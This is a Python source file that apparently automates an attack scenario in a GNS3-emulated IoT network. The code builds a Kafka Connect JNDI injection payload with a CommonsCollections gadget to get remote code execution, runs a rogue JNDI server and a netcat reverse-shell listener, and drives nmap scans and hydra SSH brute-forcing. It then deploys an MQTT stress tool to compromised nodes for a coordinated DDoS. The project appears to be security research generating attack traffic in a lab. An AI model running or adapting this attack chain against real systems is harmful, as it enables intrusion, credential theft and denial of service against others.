import time

from gns3utils import *


class AttackArguments:
    def __init__(
        self,
        server: Server,
        project,
        w_time_toolstransfert_nmap,
        w_time_nmap_hydra,
        w_time_hydra_mqttsa_scp,
        w_time_scp_coordinated_launch,
        nmap_args: str,
        hydra_args: str,
        mqttsa_args: str,
        target_mqtt_broker_ip: str,
        path_times_file: Path,
        id_kafka_connect: str,
        hydra_timeout: int,  # seconds
        telnet: Telnet = None,
        ip_kafka_connect: str = "",
    ):
        self.server: Server = server
        self.project: ProjectGNS3 = project
        self.tn: Telnet = telnet
        self.w_time_toolstransfert_nmap = w_time_toolstransfert_nmap
        self.w_time_nmap_hydra = w_time_nmap_hydra
        self.w_time_hydra_mqttsa_scp = w_time_hydra_mqttsa_scp
        self.w_time_scp_coordinated_launch = w_time_scp_coordinated_launch
        self.nmap: str = nmap_args
        self.hydra: str = hydra_args
        self.mqttsa: str = mqttsa_args
        self.target_mqtt_broker_ip: str = target_mqtt_broker_ip
        self.path_times_file: Path = path_times_file
        self.ip_kafka_connect: str = ip_kafka_connect
        self.hydra_timeout: int = hydra_timeout
        self.kafka_connect_node: gns3fy.Node = project.gns3fy_proj.get_node(
            node_id=id_kafka_connect
        )
        assert self.kafka_connect_node is not None


def check_config(
    gns3fy_proj: gns3fy.Project,
    iot_to_start: dict[str, dict[str, Any]],
    ssh_nodes: list[tuple[str, str, str]],
    mqtt_topics_to_connect: dict[str, list[str, str]],
) -> tuple[
    dict[str, dict[str, Any]], list[tuple[str, str, str]], dict[str, list[str, str]]
]:
    """
    based on config and topology, ignore settings that cannot apply to the topology
    Args:
        gns3fy_proj:
        iot_to_start:
        ssh_nodes:
        mqtt_topics_to_connect:

    Returns:
        tuple (new_iot_devices, new_ssh_nodes, new_mqtt_topics_to_connect)

    """
    all_nodes_names = list(node.name for node in gns3fy_proj.nodes)
    new_iot_devices: dict[str, dict[str, Any]] = {}
    new_ssh_nodes: list[tuple[str, str, str]] = []
    new_mqtt_topics_to_connect: dict[str, list[str, str]] = {}
    # TODO Code factorisation (remove duplicate fragment)
    for name_node_to_start, node_config in iot_to_start.items():
        if name_node_to_start not in all_nodes_names:
            print(
                f"Warning! config asked {name_node_to_start=} that does not exist."
                f"This config is ignored"
            )
        else:
            new_iot_devices[name_node_to_start] = node_config
    for node_ssh_config in ssh_nodes:
        if node_ssh_config[0] not in all_nodes_names:
            print(
                f"Warning! config asked starting ssh on {node_ssh_config[0]} that does not exist. "
                f"This config is ignored"
            )
        else:
            new_ssh_nodes.append(node_ssh_config)
    if len(new_ssh_nodes) == 0:
        print(
            "0 nodes with ssh open, attack scenario will stop after ports scan (no DDoS)"
        )
    for name_mqtt_broker, topics in mqtt_topics_to_connect.items():
        if name_mqtt_broker not in all_nodes_names:
            print(
                f"Warning! config asked to register {name_mqtt_broker=} that does not exist."
                f"This config is ignored"
            )
        else:
            new_mqtt_topics_to_connect[name_mqtt_broker] = topics
    return new_iot_devices, new_ssh_nodes, new_mqtt_topics_to_connect


def start_sinetstream_nodes(
    server: Server,
    project: ProjectGNS3,
    ss_templates: tuple[str, str, str, str],
    mqtt_broker_name,
) -> dict[str, dict[str, Any]] | None:
    """
    :param server:
    :param project:
    :param ss_templates:
    :param mqtt_broker_name:
    :return: None if some nodes could not be started (therefore we cannot interact with them latter)
    """

    def start_special_sinetstream_nodes(special_nodes: dict[str, Any]):
        for node_name in special_nodes.keys():
            if special_nodes[node_name]["status"] != "started":
                print("starting node ", node_name)
                start_node(
                    server, project, special_nodes[node_name]["node_id"], sleep_time=1
                )

    sinetstream_nodes = {
        node["name"]: node
        for node in get_all_nodes(server, project)
        if node["name"] in (f"{template_name}-1" for template_name in ss_templates)
    }
    if len(sinetstream_nodes.keys()) != len(ss_templates):
        print(
            "Not all expected SINETStream nodes present. Ignore SINETStream. \n"
            f"Expected {(f'{template_name}-1' for template_name in ss_templates)}\n"
            f"Actual {sinetstream_nodes}"
        )
        return None
    mqtt_broker_sinet: dict[str, Any] = get_nodes_id_by_name_regexp(
        server,
        project,
        re.compile(mqtt_broker_name, re.IGNORECASE),
        return_items=False,
    )[0]
    linked_switch: gns3fy.Node = get_connected_switch(
        project.gns3fy_proj, mqtt_broker_sinet["node_id"]
    )[0]
    if linked_switch.status != "started":
        print(f"starting {linked_switch}")
        start_node(server, project, linked_switch.node_id, sleep_time=3)
    start_special_sinetstream_nodes(sinetstream_nodes)

    start_node(server, project, mqtt_broker_sinet["node_id"], sleep_time=1)
    client_connect_name = "sinetstream-client-connect-1"
    # pprint(vars(container_client_connect))
    # pprint(container_client_connect.attrs["State"]["Health"]["Status"])
    connect_ip = get_node_ip(server, project, node_name="sinetstream-connect-kafka-1")

    # waiting for nodes to start
    init_timeout = 60
    cmd = f"curl http://{connect_ip}:8083"
    o = send_command_via_container(
        server,
        project,
        sinetstream_nodes[client_connect_name]["node_id"],
        cmd,
        print_command=True,
    )
    print("[start_sinetstream_nodes] wait for connect node to startup")
    timeout = init_timeout
    while '{"version":"' not in o:
        o = send_command_via_container(
            server, project, sinetstream_nodes[client_connect_name]["node_id"], cmd
        )
        time.sleep(5)
        timeout -= 5
        print(f"{timeout=}", end=" ")

        if timeout < 0:
            print(
                f"Timeout: Client connect {client_connect_name} cannot contact kafka connect container (curl http://{connect_ip}:8083 fails)\n"
                f"Make sure nodes are started correctly"
            )
            answer = ""
            while answer.lower() not in ("y", "n"):
                answer = input(
                    "y: retry starting and waiting\nn: skip, sinetstream will not work "
                )
            if answer.lower() == "n":
                return None
            else:
                start_special_sinetstream_nodes(sinetstream_nodes)
                timeout = init_timeout

    sinetstream_nodes.update({mqtt_broker_sinet["name"]: mqtt_broker_sinet})
    return sinetstream_nodes


def rce_on_connect(
    server,
    project,
    client_connect_name: str,
    client_connect_ip: str,
    connect_ip: str,
    kafka_broker_ip: str,
    sinetstream_nodes,
    remote_attacker_command,
):
    creation_time = re.sub(r"\D", "_", str(datetime.datetime.now()))
    worker_name = f"source-mqtt_{creation_time}"
    config_override = {
        "source.cluster.bootstrap.servers": f"{kafka_broker_ip}:9092",
        "target.cluster.bootstrap.servers": f"{kafka_broker_ip}:9092",
        "producer.override.sasl.jaas.config": f'com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://{client_connect_ip}:1389/serial/CommonsCollections9/exec_unix/{base64.b64encode(remote_attacker_command.encode()).decode()}" useFirstPass="true" serviceName="fKQSe" debug="true" group.provider.url="Ncjm9";',
    }
    # print(config_override)
    client_post_config(
        server,
        project,
        sinetstream_nodes[client_connect_name]["node_id"],
        "mqtt-source-config_attack.json",
        connect_ip,
        worker_name,
        config_override,
    )


def client_delete_previous_connectors(
    server: Server, project: ProjectGNS3, client_connect_id: str, connect_ip: str
):
    print("remove all previous connectors")
    cmd = """
    IFS=',' read -ra sources <<< "$(curl -s "http://CONNECT_IP:8083/connectors/" | tr -d '[]"')"; for source in "${sources[@]}"; do curl -X DELETE "http://CONNECT_IP:8083/connectors/$source"; done
    """.strip().replace(
        "CONNECT_IP", connect_ip
    )
    send_command_via_container(server, project, client_connect_id, cmd)


def register_mqtt_topic_to_kafka_topic(
    server: Server,
    project: ProjectGNS3,
    sinetstream_nodes: dict[str, dict[str, Any]],
    mqtt_broker_name: str,
    connect_ip: str,
    client_connect_name: str,
    kafka_topic: str,
    mqtt_topics: list[str],
    mqtt_borker_credentials: tuple[str, str] = None,
):
    """

    :param server:
    :param project:
    :param sinetstream_nodes:
    :param mqtt_broker_name: the name of the mqtt broker to read from
    :param connect_ip:
    :param client_connect_name:
    :param kafka_topic: the kafka topic to write to
    :param mqtt_topics: a list of the mqtt topics (in broker with mqtt_broker_name) to read from
    :param mqtt_borker_credentials: a list of the mqtt topics (in broker with mqtt_broker_name) to read from
    :return:
    """
    # TODO could be optimized to avoid getting ip multiple times (divide function in 2 functions)
    mqtt_broker_ip_port = (
        f"{get_node_ip(server, project, node_name=mqtt_broker_name)}:1883"
    )

    # creation_time to avoid errors like {"error_code":409,"message":"Connector source-mqtt24 already exists"}
    creation_time = re.sub(r"\D", "_", str(datetime.datetime.now()))
    print(
        f"Registering {len(mqtt_topics)} mqtt topics to kafka broker, topic '{kafka_topic}'...",
        end="",
    )
    counter_registered = 0
    for worker_num, mqtt_top in enumerate(mqtt_topics):
        config_override = {
            "connect.mqtt.hosts": f"tcp://{mqtt_broker_ip_port}",
            "connect.mqtt.kcql": f"INSERT INTO {kafka_topic} SELECT * FROM {mqtt_top}",
        }
        if mqtt_borker_credentials:
            config_override["connect.mqtt.username"] = mqtt_borker_credentials[0]
            config_override["connect.mqtt.password"] = mqtt_borker_credentials[1]

        client_post_config(
            server,
            project,
            sinetstream_nodes[client_connect_name]["node_id"],
            "mqtt-source-config.json",
            connect_ip,
            f"source-mqtt{worker_num}_{creation_time}",
            config_override,
        )
        counter_registered += 1
    print(f"Done for {counter_registered} topics")


def client_post_config(
    server,
    project,
    client_node_id: str,
    config_template,
    connect_ip,
    connector_name: str = "",
    config_override: dict[str:Any] = None,
):
    with open(
        f"../Dockerfiles/mqtt-connect-kafka/client_connect/{config_template}", "r"
    ) as f:
        config = json.load(f)
    if config_override is not None:
        for overrided_key, value in config_override.items():
            if overrided_key not in config["config"].keys():
                print(
                    f"\033[91m WARNING key {overrided_key} is provided but ignored (not part of template keys {config_template['config'].keys()}) \033[0m"
                )
            else:
                config["config"][overrided_key] = value
    if connector_name != "":
        config["name"] = connector_name
    cmd = f"curl -X POST -H \"Content-Type: application/json\" -d '{json.dumps(config)}' http://{connect_ip}:8083/connectors"
    send_command_via_container(
        server, project, client_node_id, cmd, print_command=False
    )


def start_rogue_jndi(server, project, sinetstream_nodes, client_connect_name):
    """
    start ldap server used to send serialized Java object for RCE
    """
    send_command_via_container(
        server,
        project,
        sinetstream_nodes[client_connect_name]["node_id"],
        "java -jar /tmp/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar",
        print_command=True,
        exec_detach=True,
    )
    time.sleep(2)


def start_file_server(server, project, sinetstream_nodes, client_connect_name):
    """
    serving files on ip:8080 in the /tmp dir of client-connect (attacker)
    :param server:
    :param project:
    :param sinetstream_nodes:
    :param client_connect_name:
    :return:
    """
    send_command_via_container(
        server,
        project,
        sinetstream_nodes[client_connect_name]["node_id"],
        "javac FileServer.java; java FileServer",
        print_command=True,
        exec_detach=True,
        work_dir="/tmp",
    )
    time.sleep(1)


def kill_process_if_str_not_found(
    att_args: AttackArguments, search_in: str, str_target: str, process_to_stop: str
):
    print(f"(kill {process_to_stop}?) search {str_target} in {search_in=}", flush=True)
    """
    pkill -P $(ps -elf | grep trans | grep -v grep | awk '{print $4}')
    """
    if search_in.find(str_target) < 0:
        # kill process with parent process has process_to_stop in cmd arg.
        print(
            f"{str_target} not in shell output. "
            f"Killing process with {process_to_stop} in cmd"
        )
        cmd = f"pkill -TERM -P $(pgrep -f '{process_to_stop}')"
        send_command_via_container(
            att_args.server, att_args.project, att_args.kafka_connect_node.node_id, cmd
        )
        time.sleep(1)


def get_name_nodes_ddos_payload(
    hydra_output: str, ssh_name_to_ip: dict[str, str]
) -> list[str]:

    name_nodes_ssh_creds_found: list[str] = []
    if len(hydra_output) < 10:
        return []
    success_ips = []
    for succ_line in hydra_output.split("\n"):
        if "host:" in succ_line and "login:" in succ_line and "password:" in succ_line:
            success_ips.append(
                succ_line.strip().split("host:")[1].strip(" ").split(" ")[0].strip()
            )

    for name_nodes in ssh_name_to_ip.keys():
        if ssh_name_to_ip[name_nodes] in success_ips:
            name_nodes_ssh_creds_found.append(name_nodes)

    return name_nodes_ssh_creds_found


def rce_via_nc_revshell(att_args: AttackArguments):
    FLAG_FUNCTION_END = "funEnd".encode()

    att_args.tn.write(b"\n")
    time.sleep(1)
    # out = tn.read_until(b"/#", timeout=2)
    # print(out.decode())
    time.sleep(att_args.w_time_toolstransfert_nmap)
    att_args.tn.write("cd /tmp/tools\n".encode())
    out = att_args.tn.read_until(b"#/", timeout=2)

    ftimes = open(att_args.path_times_file, "a")
    try:
        # start nmap scan, create files ips.txt and ssh_ips.txt
        print(
            f"start nmap {att_args.ip_kafka_connect} {datetime.datetime.now(datetime.timezone.utc)}",
            file=ftimes, flush=True
        )
        att_args.tn.write(f"./transfile.sh sop {att_args.nmap}\n".encode())
        # 24 hours timeout for nmap. If early exit, no data is written, continuing attack is impossible
        console_output = att_args.tn.read_until(
            FLAG_FUNCTION_END, timeout=60 * 60 * 24
        ).decode()
        print(console_output)
        print(
            f"finished nmap {att_args.ip_kafka_connect} {datetime.datetime.now(datetime.timezone.utc)}",
            file=ftimes, flush=True
        )
        time.sleep(att_args.w_time_nmap_hydra)

        print(
            f"start hydra {att_args.ip_kafka_connect} {datetime.datetime.now(datetime.timezone.utc)}",
            file=ftimes, flush=True
        )
        att_args.tn.write(f"./transfile.sh hyd {att_args.hydra}\n".encode())
        console_output = att_args.tn.read_until(
            FLAG_FUNCTION_END, timeout=att_args.hydra_timeout
        ).decode()
        kill_process_if_str_not_found(
            att_args, console_output, FLAG_FUNCTION_END.decode(), "./transfile.sh hyd"
        )
        print(
            f"finished hydra {att_args.ip_kafka_connect} {datetime.datetime.now(datetime.timezone.utc)}",
            file=ftimes, flush=True
        )
        hydra_output = send_command_via_container(
            att_args.server,
            att_args.project,
            att_args.kafka_connect_node.node_id,
            "cat /tmp/tools/success.txt",
        )
        if len(hydra_output) < 10:
            print(
                f"Warning! It seems no credentials found with bruteforce: {hydra_output=}"
            )
        count_hydra_success = hydra_output.count("[22][ssh] ")

        time.sleep(att_args.w_time_hydra_mqttsa_scp)

        print(
            f"start scp transfert file on IoT {att_args.ip_kafka_connect} {datetime.datetime.now(datetime.timezone.utc)}",
            file=ftimes, flush=True
        )
        att_args.tn.write("./transfile.sh tfl success.txt mqttsa\n".encode())
        console_output = att_args.tn.read_until(
            FLAG_FUNCTION_END, timeout=35 * count_hydra_success
        ).decode()
        kill_process_if_str_not_found(
            att_args, console_output, FLAG_FUNCTION_END.decode(), "./transfile.sh tfl"
        )
        print(
            f"finished scp transfert file on IoT {att_args.ip_kafka_connect} {datetime.datetime.now(datetime.timezone.utc)}",
            file=ftimes, flush=True
        )
        try:
            att_args.tn.write("\nls\n".encode())
            print("try ls command on nc revshell", file=ftimes)
        except OSError as e:
            print(
                f"Error while writing in revshell after finishing scp transfert \n{e}",
                file=ftimes, flush=True
            )
        try:
            console_output = att_args.tn.read_until(
                FLAG_FUNCTION_END, timeout=5
            ).decode()
            print(
                f"Sleeping {att_args.w_time_scp_coordinated_launch} before launching DDoS\n"
                f"last console output: {console_output}",
                file=ftimes, flush=True
            )
        except EOFError as e:
            print(
                f"Error while reading from revshell after finishing scp transfert \n{e}",
                file=ftimes, flush=True
            )
        time.sleep(att_args.w_time_scp_coordinated_launch)
        print(
            f"Starting DDoS. Try with {count_hydra_success} nodes",
            file=ftimes, flush=True
        )
        att_args.tn.write(
            f"./transfile.sh lcmd success.txt /tmp/mqttsa {att_args.mqttsa} {att_args.target_mqtt_broker_ip}\n".encode()
        )
        # wait timeout seconds and read output in nc terminal
        console_output = att_args.tn.read_until(
            FLAG_FUNCTION_END, timeout=120 + count_hydra_success * 3
        ).decode()
        # if the FLAG_FUNCTION_END is not present in console_output, kill the process
        kill_process_if_str_not_found(
            att_args, console_output, FLAG_FUNCTION_END.decode(), "./transfile.sh lcmd"
        )
    finally:
        ftimes.close()
    return hydra_output


def ddos_only(
    server,
    project: ProjectGNS3,
    att_args: AttackArguments,
    name_nodes_launching_ddos: list[str],
    mqttsa_path: Path,
) -> list[str]:
    """

    :param server:
    :param project:
    :param att_args:
    :param name_nodes_launching_ddos:
    :param mqttsa_path:
    :return: name of nodes where the DoS command was launched
    """
    name_nodes_with_payload = []
    for compromised_iot in name_nodes_launching_ddos:
        if copy_file_to_container_node(
            server, project, compromised_iot, mqttsa_path, Path("/tmp")
        ):
            name_nodes_with_payload.append(compromised_iot)
    if len(name_nodes_with_payload) != len(set(name_nodes_with_payload)):
        print(f"Warning: duplicates should not appear in {name_nodes_with_payload}")
    print(f"Starting DDoS with {name_nodes_with_payload} nodes")
    for name_compromised_iot in name_nodes_with_payload:
        nodes_executed_DoS_cmd = send_command_via_container(
            server,
            project,
            project.gns3fy_proj.get_node(name=name_compromised_iot).node_id,
            f"/tmp/mqttsa {att_args.mqttsa} {att_args.target_mqtt_broker_ip}",
            exec_detach=True,
        )
        # there were an error when trying to launch the command
        if nodes_executed_DoS_cmd is None:
            name_nodes_with_payload.remove(name_compromised_iot)
    return name_nodes_with_payload


def open_nc_listener(server, project, client_connect_node_id, nc_port) -> Telnet:
    """
    open a nc connection on port
    :param server:
    :param project:
    :param client_connect_node_id:
    :return:
    """
    hostname, telnet_port = get_node_telnet_host_port(
        server, project, client_connect_node_id
    )
    import subprocess
    import shlex

    pre_proc = subprocess.Popen(
        shlex.split(f"konsole -e telnet {hostname} {telnet_port}")
    )
    tn = Telnet()
    tn.open(hostname, telnet_port)
    tn.write(b"\n")
    time.sleep(1)
    out = tn.read_until(b"/#", timeout=2)
    print(out.decode())
    tn.write(f"/tmp/gns3/bin/nc -lp {nc_port}\n".encode())
    return tn


def openssh(server, project, node_id, username: str, pwd: str):
    """
    create user with username and password pwd and open ssh on the node with node_id
    :param server:
    :param project:
    :param node_id:
    :param username:
    :param pwd:
    :return:
    """
    node: gns3fy.Node = project.gns3fy_proj.get_node(node_id=node_id)
    if node.status != "started":
        print(
            f"Warning: cannot start ssh on node {node.name} because {node.status=} (!= 'started')"
        )
        return
    print(f"node {node.name}: create user:password {username}:{pwd}, open ssh server")
    cmd = f"useradd {username};echo {username}:{pwd} | chpasswd;service ssh restart"
    send_command_via_container(server, project, node_id, cmd)


def opennssh_all_nodes(server, project: ProjectGNS3, nodes_with_ssh):
    project.gns3fy_proj.get(get_links=False, get_nodes=True, get_stats=False)
    list(
        map(
            lambda args: openssh(*args),
            (
                (
                    server,
                    project,
                    project.gns3fy_proj.get_node(name=n_name).node_id,
                    user,
                    passwd,
                )
                for n_name, user, passwd in nodes_with_ssh
            ),
        )
    )
    print(f"ssh opened on nodes {' '.join(n for n, _, _ in nodes_with_ssh)}")
